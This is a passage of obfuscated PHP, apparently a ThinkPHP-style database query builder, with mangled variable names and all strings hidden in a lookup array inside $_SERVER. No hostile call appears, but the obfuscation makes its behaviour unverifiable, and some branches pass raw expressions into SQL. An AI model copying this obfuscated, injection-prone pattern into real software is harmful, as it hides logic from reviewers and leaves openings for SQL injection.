(empty($π·®Èê∫[$≤´◊ßìÙ[948]])) { think_exception(think_lang($≤´◊ßìÙ[949])); } $this->dbType = ucwords(strtolower($π·®Èê∫[$≤´◊ßìÙ[948]])); $¨ñ¥ﬂıÊ = $≤´◊ßìÙ[950] . $this->dbType; if (class_exists($¨ñ¥ﬂıÊ)) { $¨†÷Æ¨ª = new $¨ñ¥ﬂıÊ($π·®Èê∫); if ($≤´◊ßìÙ[951] != strtolower($π·®Èê∫[$≤´◊ßìÙ[948]])) { $¨†÷Æ¨ª->dbType = strtoupper($this->dbType); } else { $¨†÷Æ¨ª->dbType = $this->_getDsnType($π·®Èê∫[$≤´◊ßìÙ[903]]); } } else { think_exception(think_lang($≤´◊ßìÙ[952]) . $≤´◊ßìÙ[953] . $¨ñ¥ﬂıÊ); } return $¨†÷Æ¨ª; } public function __call($∞¨ü˛ó, $Ö¬ñÃ—Ò) { if (method_exists($this, $∞¨ü˛ó)) { return call_user_func_array(array($this, $∞¨ü˛ó), $Ö¬ñÃ—Ò); } } protected function _getDsnType($‰É÷á∞≈) { $‹Æÿò¯Ç = explode($_SERVER[Çâä∆◊¡][4], $‰É÷á∞≈); $›ÅÁ¥›¡ = strtoupper(trim($‹Æÿò¯Ç[0])); return $›ÅÁ¥›¡; } private function parseConfig($ µ∆∑®Œ = '') { $èˆÇÔòõ =& $_SERVER[Çâä∆◊¡]; if (!empty($ µ∆∑®Œ) && is_string($ µ∆∑®Œ)) { $ µ∆∑®Œ = $this->parseDSN($ µ∆∑®Œ); } elseif (is_array($ µ∆∑®Œ)) { $ µ∆∑®Œ = array_change_key_case($ µ∆∑®Œ); $ µ∆∑®Œ = array($èˆÇÔòõ[948] => $ µ∆∑®Œ[$èˆÇÔòõ[954]], $èˆÇÔòõ[875] => $ µ∆∑®Œ[$èˆÇÔòõ[955]], $èˆÇÔòõ[876] => $ µ∆∑®Œ[$èˆÇÔòõ[956]], $èˆÇÔòõ[873] => $ µ∆∑®Œ[$èˆÇÔòõ[957]], $èˆÇÔòõ[874] => $ µ∆∑®Œ[$èˆÇÔòõ[958]], $èˆÇÔòõ[21] => $ µ∆∑®Œ[$èˆÇÔòõ[959]], $èˆÇÔòõ[903] => $ µ∆∑®Œ[$èˆÇÔòõ[960]], $èˆÇÔòõ[17] => isset($ µ∆∑®Œ[$èˆÇÔòõ[961]]) ? $ µ∆∑®Œ[$èˆÇÔòõ[961]] : array()); } elseif (empty($ µ∆∑®Œ)) { if (think_config($èˆÇÔòõ[962]) && $èˆÇÔòõ[951] != strtolower(think_config($èˆÇÔòõ[963]))) { $ µ∆∑®Œ = $this->parseDSN(think_config($èˆÇÔòõ[962])); } else { $ µ∆∑®Œ = array($èˆÇÔòõ[948] => think_config($èˆÇÔòõ[963]), $èˆÇÔòõ[875] => think_config($èˆÇÔòõ[964]), $èˆÇÔòõ[876] => think_config($èˆÇÔòõ[965]), $èˆÇÔòõ[873] => think_config($èˆÇÔòõ[966]), $èˆÇÔòõ[874] => think_config($èˆÇÔòõ[967]), $èˆÇÔòõ[21] => think_config($èˆÇÔòõ[241]), $èˆÇÔòõ[903] => think_config($èˆÇÔòõ[962]), $èˆÇÔòõ[17] => think_config($èˆÇÔòõ[968])); } } return $ µ∆∑®Œ; } protected function initConnect($°®÷ÄÄ = true) { if (1 == think_config($_SERVER[Çâä∆◊¡][22])) { $this->_linkID = $this->multiConnect($°®÷ÄÄ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $·∏˘ôÔÛ => $·í¢¶≤˝) { $this->_linkID = $·í¢¶≤˝; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($¸Ñ¨ËÅº = false) { $‘ì∑·¥√ =& $_SERVER[Çâä∆◊¡]; static $∑£Õ©–„ = array(); static $â· •”’ = -1; if (empty($∑£Õ©–„)) { foreach ($this->config as $π“™ÄˆÓ => $–¶˛ÜìÕ) { $∑£Õ©–„[$π“™ÄˆÓ] = explode($‘ì∑·¥√[50], $–¶˛ÜìÕ); } } if (think_config($‘ì∑·¥√[969])) { if ($¸Ñ¨ËÅº || think_config($‘ì∑·¥√[388]) === !0) { $ï⁄ÕÔÇí = floor(mt_rand(0, think_config($‘ì∑·¥√[970]) - 1)); $â· •”’ = $ï⁄ÕÔÇí; } else { if (is_numeric(think_config($‘ì∑·¥√[971]))) { $ï⁄ÕÔÇí = think_config($‘ì∑·¥√[971]); } else { $ï⁄ÕÔÇí = floor(mt_rand(think_config($‘ì∑·¥√[970]), count($∑£Õ©–„[$‘ì∑·¥√[873]]) - 1)); } } } else { $ï⁄ÕÔÇí = floor(mt_rand(0, count($∑£Õ©–„[$‘ì∑·¥√[873]]) - 1)); $â· •”’ = $ï⁄ÕÔÇí; } $ï⁄ÕÔÇí = $â· •”’ !== -1 ? $â· •”’ : $ï⁄ÕÔÇí; $÷˚«˘Úœ = array($‘ì∑·¥√[875] => isset($∑£Õ©–„[$‘ì∑·¥√[875]][$ï⁄ÕÔÇí]) ? $∑£Õ©–„[$‘ì∑·¥√[875]][$ï⁄ÕÔÇí] : $∑£Õ©–„[$‘ì∑·¥√[875]][0], $‘ì∑·¥√[876] => isset($∑£Õ©–„[$‘ì∑·¥√[876]][$ï⁄ÕÔÇí]) ? $∑£Õ©–„[$‘ì∑·¥√[876]][$ï⁄ÕÔÇí] : $∑£Õ©–„[$‘ì∑·¥√[876]][0], $‘ì∑·¥√[873] => isset($∑£Õ©–„[$‘ì∑·¥√[873]][$ï⁄ÕÔÇí]) ? $∑£Õ©–„[$‘ì∑·¥√[873]][$ï⁄ÕÔÇí] : $∑£Õ©–„[$‘ì∑·¥√[873]][0], $‘ì∑·¥√[874] => isset($∑£Õ©–„[$‘ì∑·¥√[874]][$ï⁄ÕÔÇí]) ? $∑£Õ©–„[$‘ì∑·¥√[874]][$ï⁄ÕÔÇí] : $∑£Õ©–„[$‘ì∑·¥√[874]][0], $‘ì∑·¥√[21] => isset($∑£Õ©–„[$‘ì∑·¥√[21]][$ï⁄ÕÔÇí]) ? $∑£Õ©–„[$‘ì∑·¥√[21]][$ï⁄ÕÔÇí] : $∑£Õ©–„[$‘ì∑·¥√[21]][0], $‘ì∑·¥√[903] => isset($∑£Õ©–„[$‘ì∑·¥√[903]][$ï⁄ÕÔÇí]) ? $∑£Õ©–„[$‘ì∑·¥√[903]][$ï⁄ÕÔÇí] : $∑£Õ©–„[$‘ì∑·¥√[903]][0], $‘ì∑·¥√[17] => isset($∑£Õ©–„[$‘ì∑·¥√[17]][$ï⁄ÕÔÇí]) ? $∑£Õ©–„[$‘ì∑·¥√[17]][$ï⁄ÕÔÇí] : $∑£Õ©–„[$‘ì∑·¥√[17]][0]); return $this->connect($÷˚«˘Úœ, $ï⁄ÕÔÇí); } public function parseDSN($–ëæ˛’¶) { $Õ˝†õ†º =& $_SERVER[Çâä∆◊¡]; if (empty($–ëæ˛’¶)) { return !1; } $á´¿˝¬æ = parse_url($–ëæ˛’¶); if ($á´¿˝¬æ[$Õ˝†õ†º[173]]) { $òÊçÖ‹≠ = array($Õ˝†õ†º[948] => $á´¿˝¬æ[$Õ˝†õ†º[173]], $Õ˝†õ†º[875] => isset($á´¿˝¬æ[$Õ˝†õ†º[594]]) ? $á´¿˝¬æ[$Õ˝†õ†º[594]] : $Õ˝†õ†º[12], $Õ˝†õ†º[876] => isset($á´¿˝¬æ[$Õ˝†õ†º[972]]) ? $á´¿˝¬æ[$Õ˝†õ†º[972]] : $Õ˝†õ†º[12], $Õ˝†õ†º[873] => isset($á´¿˝¬æ[$Õ˝†õ†º[174]]) ? $á´¿˝¬æ[$Õ˝†õ†º[174]] : $Õ˝†õ†º[12], $Õ˝†õ†º[874] => isset($á´¿˝¬æ[$Õ˝†õ†º[175]]) ? $á´¿˝¬æ[$Õ˝†õ†º[175]] : $Õ˝†õ†º[12], $Õ˝†õ†º[21] => isset($á´¿˝¬æ[$Õ˝†õ†º[78]]) ? substr($á´¿˝¬æ[$Õ˝†õ†º[78]], 1) : $Õ˝†õ†º[12]); } else { preg_match($Õ˝†õ†º[973], trim($–ëæ˛’¶), $ÜâêâÌÕ); $òÊçÖ‹≠ = array($Õ˝†õ†º[948] => $ÜâêâÌÕ[1], $Õ˝†õ†º[875] => $ÜâêâÌÕ[2], $Õ˝†õ†º[876] => $ÜâêâÌÕ[3], $Õ˝†õ†º[873] => $ÜâêâÌÕ[4], $Õ˝†õ†º[874] => $ÜâêâÌÕ[5], $Õ˝†õ†º[21] => $ÜâêâÌÕ[6]); } $òÊçÖ‹≠[$Õ˝†õ†º[903]] = $Õ˝†õ†º[12]; return $òÊçÖ‹≠; } protected function debug() { $Ω√€õ‰¥ =& $_SERVER[Çâä∆◊¡]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ω√€õ‰¥[974]; if (think_config($Ω√€õ‰¥[975])) { think_status($Ω√€õ‰¥[976]); think_trace($this->queryStr . $Ω√€õ‰¥[977] . think_status($Ω√€õ‰¥[24], $Ω√€õ‰¥[976], 6) . $Ω√€õ‰¥[978], $Ω√€õ‰¥[12], $Ω√€õ‰¥[979]); } } protected function parseLock($ª∏Ïéæ‡ = false) { $ºıı”Æ§ =& $_SERVER[Çâä∆◊¡]; if (!$ª∏Ïéæ‡) { return $ºıı”Æ§[12]; } if ($ºıı”Æ§[905] == $this->dbType) { return $ºıı”Æ§[980]; } return $ºıı”Æ§[981]; } protected function parseSet($é»éàÉñ) { $˙–„°†Ω =& $_SERVER[Çâä∆◊¡]; foreach ($é»éàÉñ as $…“ú¨Ãµ => $›ÇØ·Õé) { if (is_array($›ÇØ·Õé) && $˙–„°†Ω[292] == $›ÇØ·Õé[0]) { $Ú÷ûÓ⁄°[] = $this->parseKey($…“ú¨Ãµ) . $˙–„°†Ω[871] . $›ÇØ·Õé[1]; } elseif (is_scalar($›ÇØ·Õé) || is_null($›ÇØ·Õé)) { $Ú÷ûÓ⁄°[] = $this->parseKey($…“ú¨Ãµ) . $˙–„°†Ω[871] . $this->parseValue($›ÇØ·Õé); } } return $˙–„°†Ω[982] . implode($˙–„°†Ω[50], $Ú÷ûÓ⁄°); } protected function bindParam($ë±–˝â∫, $å˛´ßÙÛ) { $this->bind[$_SERVER[Çâä∆◊¡][4] . $ë±–˝â∫] = $å˛´ßÙÛ; } protected function parseBind($‡©¶®ê–) { $‡©¶®ê– = array_merge($this->bind, $‡©¶®ê–); $this->bind = array(); return $‡©¶®ê–; } function parseKey(&$¥™ﬂÇ«Å, $µ ‡≠˛… = true) { if ($µ ‡≠˛…) { $¥™ﬂÇ«Å = $this->parseKeyCheck($¥™ﬂÇ«Å); } return $¥™ﬂÇ«Å; } function parseKeyCheck($’Äﬁﬂ‰ø) { $ÉÛ∑ÊÜÂ =& $_SERVER[Çâä∆◊¡]; $’Äﬁﬂ‰ø = trim($’Äﬁﬂ‰ø); if (!preg_match($ÉÛ∑ÊÜÂ[983], $’Äﬁﬂ‰ø)) { think_exception($ÉÛ∑ÊÜÂ[984] . $’Äﬁﬂ‰ø); } return $’Äﬁﬂ‰ø; } protected function parseValue($™Á±ö¨ò) { $”óì˚”‡ =& $_SERVER[Çâä∆◊¡]; if (is_string($™Á±ö¨ò)) { $™Á±ö¨ò = $”óì˚”‡[944] . $this->escapeString($™Á±ö¨ò) . $”óì˚”‡[944]; } elseif (isset($™Á±ö¨ò[0]) && is_string($™Á±ö¨ò[0]) && strtolower($™Á±ö¨ò[0]) == $”óì˚”‡[292]) { $™Á±ö¨ò = $this->escapeString($™Á±ö¨ò[1]); } elseif (is_array($™Á±ö¨ò)) { $™Á±ö¨ò = array_map(array($this, $”óì˚”‡[945]), $™Á±ö¨ò); } elseif (is_bool($™Á±ö¨ò)) { $™Á±ö¨ò = $™Á±ö¨ò ? $”óì˚”‡[89] : $”óì˚”‡[190]; } elseif (is_null($™Á±ö¨ò)) { $™Á±ö¨ò = $”óì˚”‡[104]; } return $™Á±ö¨ò; } protected function parseField($¨ã∏πÂ∂) { $⁄ÿÒº≈Í =& $_SERVER[Çâä∆◊¡]; if (is_string($¨ã∏πÂ∂) && strpos($¨ã∏πÂ∂, $⁄ÿÒº≈Í[50])) { $¨ã∏πÂ∂ = explode($⁄ÿÒº≈Í[50], $¨ã∏πÂ∂); } if (is_array($¨ã∏πÂ∂)) { $œØØªÀ∑ = array(); foreach ($¨ã∏πÂ∂ as $Ÿ±Èﬂ√Û => $ŒﬂåÕ≥Ú) { if (!is_numeric($Ÿ±Èﬂ√Û)) { $œØØªÀ∑[] = $this->parseKey($Ÿ±Èﬂ√Û, !1) . $⁄ÿÒº≈Í[985] . $this->parseKey($ŒﬂåÕ≥Ú); } else { $œØØªÀ∑[] = $this->parseKey($ŒﬂåÕ≥Ú); } } $ì˜›œŸÊ = implode($⁄ÿÒº≈Í[50], $œØØªÀ∑); } elseif (is_string($¨ã∏πÂ∂) && !empty($¨ã∏πÂ∂)) { $ì˜›œŸÊ = $¨ã∏πÂ∂; } else { $ì˜›œŸÊ = $⁄ÿÒº≈Í[181]; } return $ì˜›œŸÊ; } protected function parseTable($ÚÉ«úŸì) { $Ìéµ‘ÚÖ =& $_SERVER[Çâä∆◊¡]; if (is_array($ÚÉ«úŸì)) { $∑Øˆ¿≤Ô = array(); foreach ($ÚÉ«úŸì as $¿∑…ıÒ“ => $Ó±ﬁﬂ⁄–) { if (!is_numeric($¿∑…ıÒ“)) { $∑Øˆ¿≤Ô[] = $this->parseKey($¿∑…ıÒ“) . $Ìéµ‘ÚÖ[53] . $this->parseKey($Ó±ﬁﬂ⁄–); } else { $∑Øˆ¿≤Ô[] = $this->parseKey($¿∑…ıÒ“); } } $ÚÉ«úŸì = $∑Øˆ¿≤Ô; } elseif (is_string($ÚÉ«úŸì)) { if (strstr($ÚÉ«úŸì, $Ìéµ‘ÚÖ[53])) { return $ÚÉ«úŸì; } $ÚÉ«úŸì = explode($Ìéµ‘ÚÖ[50], $ÚÉ«úŸì); array_walk($ÚÉ«úŸì, array($this, $Ìéµ‘ÚÖ[893])); } return $Ìéµ‘ÚÖ[887] . trim(implode($Ìéµ‘ÚÖ[986], $ÚÉ«úŸì), $Ìéµ‘ÚÖ[380]) . $Ìéµ‘ÚÖ[887]; } protected function parseWhere($¸∑ù”¬ñ) { $ã¥‹∑¨ =& $_SERVER[Çâä∆◊¡]; $ÃÕ‹Î˚˛ = $ã¥‹∑¨[12]; if (is_string($¸∑ù”¬ñ)) { $ÃÕ‹Î˚˛ = $¸∑ù”¬ñ; } else { $È‚ß∞∆† = isset($¸∑ù”¬ñ[$ã¥‹∑¨[987]]) ? strtoupper($¸∑ù”¬ñ[$ã¥‹∑¨[987]]) : $ã¥‹∑¨[12]; if (in_array($È‚ß∞∆†, array($ã¥‹∑¨[988], $ã¥‹∑¨[989], $ã¥‹∑¨[990]))) { $È‚ß∞∆† = $ã¥‹∑¨[53] . $È‚ß∞∆† . $ã¥‹∑¨[53]; unset($¸∑ù”¬ñ[$ã¥‹∑¨[987]]); } else { $È‚ß∞∆† = $ã¥‹∑¨[991]; } foreach ($¸∑ù”¬ñ as $˙ûµ¶Õ‘ => $®ÿ˚“ﬁ‚) { $ÃÕ‹Î˚˛ .= $ã¥‹∑¨[272]; if (is_numeric($˙ûµ¶Õ‘)) { $˙ûµ¶Õ‘ = $ã¥‹∑¨[992]; } if (0 === strpos($˙ûµ¶Õ‘, $ã¥‹∑¨[11])) { $ÃÕ‹Î˚˛ .= $this->parseThinkWhere($˙ûµ¶Õ‘, $®ÿ˚“ﬁ‚); } else { if (!preg_match($ã¥‹∑¨[993], trim($˙ûµ¶Õ‘))) { think_exception(think_lang($ã¥‹∑¨[994]) . $ã¥‹∑¨[4] . $˙ûµ¶Õ‘); } $◊‹˝ËÆû = is_array($®ÿ˚“ﬁ‚) && isset($®ÿ˚“ﬁ‚[$ã¥‹∑¨[995]]); $˙ûµ¶Õ‘ = trim($˙ûµ¶Õ‘); if (strpos($˙ûµ¶Õ‘, $ã¥‹∑¨[278])) { $¡¥±»≤Œ = explode($ã¥‹∑¨[278], $˙ûµ¶Õ‘); $¶∂†È–⁄ = array(); foreach ($¡¥±»≤Œ as $ËæÆ√ÿó => $˝•ä∫óê) { $◊ç≤ﬁœ÷ = $◊‹˝ËÆû ? $®ÿ˚“ﬁ‚[$ËæÆ√ÿó] : $®ÿ˚“ﬁ‚; $¶∂†È–⁄[] = $ã¥‹∑¨[255] . $this->parseWhereItem($this->parseKey($˝•ä∫óê), $◊ç≤ﬁœ÷) . $ã¥‹∑¨[892]; } $ÃÕ‹Î˚˛ .= implode($ã¥‹∑¨[996], $¶∂†È–⁄); } elseif (strpos($˙ûµ¶Õ‘, $ã¥‹∑¨[279])) { $¡¥±»≤Œ = explode($ã¥‹∑¨[279], $˙ûµ¶Õ‘); $¶∂†È–⁄ = array(); foreach ($¡¥±»≤Œ as $ËæÆ√ÿó => $˝•ä∫óê) { $◊ç≤ﬁœ÷ = $◊‹˝ËÆû ? $®ÿ˚“ﬁ‚[$ËæÆ√ÿó] : $®ÿ˚“ﬁ‚; $¶∂†È–⁄[] = $ã¥‹∑¨[255] . $this->parseWhereItem($this->parseKey($˝•ä∫óê), $◊ç≤ﬁœ÷) . $ã¥‹∑¨[892]; } $ÃÕ‹Î˚˛ .= implode($ã¥‹∑¨[991], $¶∂†È–⁄); } else { $ÃÕ‹Î˚˛ .= $this->parseWhereItem($this->parseKey($˙ûµ¶Õ‘), $®ÿ˚“ﬁ‚); } } $ÃÕ‹Î˚˛ .= $ã¥‹∑¨[273] . $È‚ß∞∆†; } $ÃÕ‹Î˚˛ = substr($ÃÕ‹Î˚˛, 0, -strlen($È‚ß∞∆†)); } return empty($ÃÕ‹Î˚˛) ? $ã¥‹∑¨[12] : $ã¥‹∑¨[997] . $ÃÕ‹Î˚˛; } protected function parseWhereItem($≥ëõàÜŸ, $•ƒø≈„â) { $¯“∆ã˛™ =& $_SERVER[Çâä∆◊¡]; $á• ≤≥û = $¯“∆ã˛™[12]; if (is_array($•ƒø≈„â)) { if (is_string($•ƒø≈„â[0])) { $†ÖË∞ìÃ = strtolower($•ƒø≈„â[0]); if (in_array($•ƒø≈„â[0], array($¯“∆ã˛™[871], $¯“∆ã˛™[998], $¯“∆ã˛™[999], $¯“∆ã˛™[1000], $¯“∆ã˛™[1001], $¯“∆ã˛™[1002]))) { $á• ≤≥û .= $≥ëõàÜŸ . $¯“∆ã˛™[53] . $•ƒø≈„â[0] . $¯“∆ã˛™[53] . $this->parseValue($•ƒø≈„â[1]); } elseif (preg_match($¯“∆ã˛™[1003], $•ƒø≈„â[0])) { $á• ≤≥û .= $≥ëõàÜŸ . $¯“∆ã˛™[53] . $this->exp[$†ÖË∞ìÃ] . $¯“∆ã˛™[53] . $this->parseValue($•ƒø≈„â[1]); } elseif (preg_match($¯“∆ã˛™[1004], $•ƒø≈„â[0])) { if (is_array($•ƒø≈„â[1])) { $‡∆ùö‹√ = isset($•ƒø≈„â[2]) ? strtoupper($•ƒø≈„â[2]) : $¯“∆ã˛™[989]; if (in_array($‡∆ùö‹√, array($¯“∆ã˛™[988], $¯“∆ã˛™[989], $¯“∆ã˛™[990]))) { $˜¨¸ˆóË = array(); foreach ($•ƒø≈„â[1] as $Ì©ÅÚâ») { $˜¨¸ˆóË[] = $≥ëõàÜŸ . $¯“∆ã˛™[53] . $this->exp[$†ÖË∞ìÃ] . $¯“∆ã˛™[53] . $this->parseValue($Ì©ÅÚâ»); } $á• ≤≥û .= $¯“∆ã˛™[255] . implode($¯“∆ã˛™[53] . $‡∆ùö‹√ . $¯“∆ã˛™[53], $˜¨¸ˆóË) . $¯“∆ã˛™[892]; } } else { $á• ≤≥û .= $≥ëõàÜŸ . $¯“∆ã˛™[53] . $this->exp[$†ÖË∞ìÃ] . $¯“∆ã˛™[53] . $this->parseValue($•ƒø≈„â[1]); } } elseif ($¯“∆ã˛™[292] == $†ÖË∞ìÃ) { $á• ≤≥û .= $¯“∆ã˛™[890] . $≥ëõàÜŸ . $¯“∆ã˛™[53] . $•ƒø≈„â[1] . $¯“∆ã˛™[1005]; } elseif (preg_match($¯“∆ã˛™[1006], $•ƒø≈„â[0])) { $á• ≤≥û .= $•ƒø≈„â[0]; } elseif (preg_match($¯“∆ã˛™[1007], $•ƒø≈„â[0])) { if (isset($•ƒø≈„â[2]) && $¯“∆ã˛™[292] == $•ƒø≈„â[2]) { $á• ≤≥û .= $≥ëõàÜŸ . $¯“∆ã˛™[53] . $this->exp[$†ÖË∞ìÃ] . $¯“∆ã˛™[53] . $•ƒø≈„â[1]; } else { if (is_string($•ƒø≈„â[1])) { $•ƒø≈„â[1] = explode($¯“∆ã˛™[50], $•ƒø≈„â[1]); } $÷ê‰≥˝√ = implode($¯“∆ã˛™[50], $this->parseValue($•ƒø≈„â[1])); $á• ≤≥û .= $≥ëõàÜŸ . $¯“∆ã˛™[53] . $this->exp[$†ÖË∞ìÃ] . $¯“∆ã˛™[890] . $÷ê‰≥˝√ . $¯“∆ã˛™[892]; } } elseif (preg_match($¯“∆ã˛™[1008], $•ƒø≈„â[0])) { $ºöÌÁ˙¬ = is_string($•ƒø≈„â[1]) ? explode($¯“∆ã˛™[50], $•ƒø≈„â[1]) : $•ƒø≈„â[1]; $á• ≤≥û .= $¯“∆ã˛™[890] . $≥ëõàÜŸ . $¯“∆ã˛™[53] . $this->exp[$†ÖË∞ìÃ] . $¯“∆ã˛™[53] . $this->parseValue($ºöÌÁ˙¬[0]) . $¯“∆ã˛™[991] . $this->parseValue($ºöÌÁ˙¬[1]) . $¯“∆ã˛™[273]; } else { think_exception(think_lang($¯“∆ã˛™[994]) . $¯“∆ã˛™[4] . $•ƒø≈„â[0]); } } else { $Èæ›•€  = count($•ƒø≈„â); $™à·™£∂ = $¯“∆ã˛™[12]; if (is_string($•ƒø≈„â[$Èæ›•€  - 1])) { $™à·™£∂ = isset($•ƒø≈„â[$Èæ›•€  - 1]) ? strtoupper($•ƒø≈„â[$Èæ›•€  - 1]) : $¯“∆ã˛™[12]; if (in_array($™à·™£∂, array($¯“∆ã˛™[988], $¯“∆ã˛™[989], $¯“∆ã˛™[990]))) { $Èæ›•€  = $Èæ›•€  - 1; } } else { $™à·™£∂ = $¯“∆ã˛™[988]; } for ($≥àö·˝ = 0; $≥àö·˝ < $Èæ›•€ ; $≥àö·˝++) { $ºöÌÁ˙¬ = is_array($•ƒø≈„â[$≥àö·˝]) ? $•ƒø≈„â[$≥àö·˝][1] : $•ƒø≈„â[$≥àö·˝]; if ($¯“∆ã˛™[292] == strtolower($•ƒø≈„â[$≥àö·˝][0])) { $á• ≤≥û .= $¯“∆ã˛™[255] . $≥ëõàÜŸ . $¯“∆ã˛™[53] . $ºöÌÁ˙¬ . $¯“∆ã˛™[1005] . $™à·™£∂ . $¯“∆ã˛™[53]; } else { $Ï¢˚É÷© = is_array($•ƒø≈„â[$≥àö·˝]) ? $this->exp[strtolower($•ƒø≈„â[$≥àö·˝][0])] : $¯“∆ã˛™[871]; if (!$Ï¢˚É÷© && is_array($•ƒø≈„â[$≥àö·˝]) && in_array($•ƒø≈„â[$≥àö·˝][0], array($¯“∆ã˛™[871], $¯“∆ã˛™[998], $¯“∆ã˛™[999], $¯“∆ã˛™[1000], $¯“∆ã˛™[1001], $¯“∆ã˛™[1002]))) { $Ï¢˚É÷© = $•ƒø≈„â[$≥àö·˝][0]; } $á• ≤≥û .= $¯“∆ã˛™[255] . $≥ëõàÜŸ . $¯“∆ã˛™[53] . $Ï¢˚É÷© . $¯“∆ã˛™[53] . $this->parseValue($ºöÌÁ˙¬) . $¯“∆ã˛™[1005] . $™à·™£∂ . $¯“∆ã˛™[53]; } } $á• ≤≥û = substr($á• ≤≥û, 0, -4); } } else { $á• ≤≥û .= $≥ëõàÜŸ . $¯“∆ã˛™[1009] . $this->parseValue($•ƒø≈„â); } return $á• ≤≥û; } protected function parseThinkWhere($ºª⁄˜õ“, $«´Ø∞Úﬂ) { $ÔéÚ±éÅ =& $_SERVER[Çâä∆◊¡]; $Õ—Ë·‡ò = $ÔéÚ±éÅ[12]; switch ($ºª⁄˜õ“) { case $ÔéÚ±éÅ[347]: $Õ—Ë·‡ò = $«´Ø∞Úﬂ; break; case $ÔéÚ±éÅ[992]: $Õ—Ë·‡ò = is_string($«´Ø∞Úﬂ) ? $«´Ø∞Úﬂ : substr($this->parseWhere($«´Ø∞Úﬂ), 6); break; case $ÔéÚ±éÅ[1010]: parse_str($«´Ø∞Úﬂ, $Ùπ°±÷Ç); if (isset($Ùπ°±÷Ç[$ÔéÚ±éÅ[987]])) { $‘Æ◊…µ’ = $ÔéÚ±éÅ[53] . strtoupper($Ùπ°±÷Ç[$ÔéÚ±éÅ[987]]) . $ÔéÚ±éÅ[53]; unset($Ùπ°±÷Ç[$ÔéÚ±éÅ[987]]); } else { $‘Æ◊…µ’ = $ÔéÚ±éÅ[991]; } $Í°ú‘‹Ô = array(); foreach ($Ùπ°±÷Ç as $«ıÌßΩ¬ => $Ωºÿ∆¬‰) { $Í°ú‘‹Ô[] = $this->parseKey($«ıÌßΩ¬) . $ÔéÚ±éÅ[1009] . $this->parseValue($Ωºÿ∆¬‰); } $Õ—Ë·‡ò = implode($‘Æ◊…µ’, $Í°ú‘‹Ô); break; } return $Õ—Ë·‡ò; } protected function parseLimit($Íå¿Æ˜Ë) { $∂ôÙ´åÍ =& $_SERVER[Çâä∆◊¡]; return !empty($Íå¿Æ˜Ë) ? $∂ôÙ´åÍ[51] . $Íå¿Æ˜Ë . $∂ôÙ´åÍ[53] : $∂ôÙ´åÍ[12]; } protected function parseJoin($†ÿ∏“Ÿ®) { $Ø„∞à‘· =& $_SERVER[Çâä∆◊¡]; $øê‹ÎÑÖ = $Ø„∞à‘·[12]; if (!empty($†ÿ∏“Ÿ®)) { if (is_array($†ÿ∏“Ÿ®)) { foreach ($†ÿ∏“Ÿ® as $æÂÅåñÁ => $⁄ƒ–≤¨Ï) { if (!1 !== stripos($⁄ƒ–≤¨Ï, $Ø„∞à‘·[1011])) { $øê‹ÎÑÖ .= $Ø„∞à‘·[53] . $⁄ƒ–≤¨Ï; } else { $øê‹ÎÑÖ .= $Ø„∞à‘·[1012] . $⁄ƒ–≤¨Ï; } } } else { $øê‹ÎÑÖ .= $Ø„∞à‘·[1012] . $†ÿ∏“Ÿ®; } } $øê‹ÎÑÖ = preg_replace($Ø„∞à‘·[1013], think_config($Ø„∞à‘·[917]) . $Ø„∞à‘·[1014], $øê‹ÎÑÖ); return $øê‹ÎÑÖ; } protected function parseOrder($¸√ûúé‹) { $€Ÿ¥–˚» =& $_SERVER[Çâä∆◊¡]; if (is_array($¸√ûúé‹)) { $≈≤’‰ı¸ = array(); foreach ($¸√ûúé‹ as $≠¯èÇ⁄ú => $˘ÇÉŸﬁ∆) { if (is_numeric($≠¯èÇ⁄ú)) { $≈≤’‰ı¸[] = $this->parseKey($˘ÇÉŸﬁ∆); } else { $˘ÇÉŸﬁ∆ = in_array(strtoupper(trim($˘ÇÉŸﬁ∆)), array($€Ÿ¥–˚»[1015], $€Ÿ¥–˚»[1016])) ? $€Ÿ¥–˚»[53] . $˘ÇÉŸﬁ∆ : $€Ÿ¥–˚»[12]; if (preg_match($€Ÿ¥–˚»[1017], $≠¯èÇ⁄ú)) { $≈≤’‰ı¸[] = $this->parseKey($≠¯èÇ⁄ú) . $˘ÇÉŸﬁ∆; } else { think_exception($€Ÿ¥–˚»[1018] . $≠¯èÇ⁄ú); } } } $¸√ûúé‹ = implode($€Ÿ¥–˚»[50], $≈≤’‰ı¸); } return !empty($¸√ûúé‹) ? $€Ÿ¥–˚»[1019] . $¸√ûúé‹ : $€Ÿ¥–˚»[12]; } protected function parseGroup($«´ò∂ˆõ) { $—ãòˆí =& $_SERVER[Çâä∆◊¡]; return !empty($«´ò∂ˆõ) ? $—ãòˆí[1020] . $«´ò∂ˆõ : $—ãòˆí[12]; } protected function parseHaving($¸öåˆˆ∑) { $˛∆ªà–∑ =& $_SERVER[Çâä∆◊¡]; return !empty($¸öåˆˆ∑) ? $˛∆ªà–∑[1021] . $¸öåˆˆ∑ : $˛∆ªà–∑[12]; } protected function parseComment($ñ£ƒ∞ˆ) { $™ê“ùæÏ =& $_SERVER[Çâä∆◊¡]; return !empty($ñ£ƒ∞ˆ) ? $™ê“ùæÏ[1022] . $ñ£ƒ∞ˆ . $™ê“ùæÏ[1023] : $™ê“ùæÏ[12]; } protected function parseDistinct($·ë‘À˜ﬂ) { $Î∞ÚœÏÇ =& $_SERVER[Çâä∆◊¡]; return !empty($·ë‘À˜ﬂ) ? $Î∞ÚœÏÇ[1024] : $Î∞ÚœÏÇ[12]; } protected function parseUnion($Î˚‹©ÃÅ) { $Ω•ÄÄÓœ =& $_SERVER[Çâä∆◊¡]; if (empty($Î˚‹©ÃÅ)) { return $Ω•ÄÄÓœ[12]; } if (isset($Î˚‹©ÃÅ[$Ω•ÄÄÓœ[343]])) { $Û »ÍÆŒ = $Ω•ÄÄÓœ[1025]; unset($Î˚‹©ÃÅ[$Ω•ÄÄÓœ[343]]); } else { $Û »ÍÆŒ = $Ω•ÄÄÓœ[1026]; } foreach ($Î˚‹©ÃÅ as $â∑™•˘Å) { $öî•∆ÆÅ[] = $Û »ÍÆŒ . (is_array($â∑™•˘Å) ? $this->buildSelectSql($â∑™•˘Å) : $â∑™•˘Å); } return implode($Ω•ÄÄÓœ[53], $öî•∆ÆÅ); } public function insert($û≠ƒ≈â‹, $ÅÚ¸Õªó = array(), $í€ï›·¡ = false) { 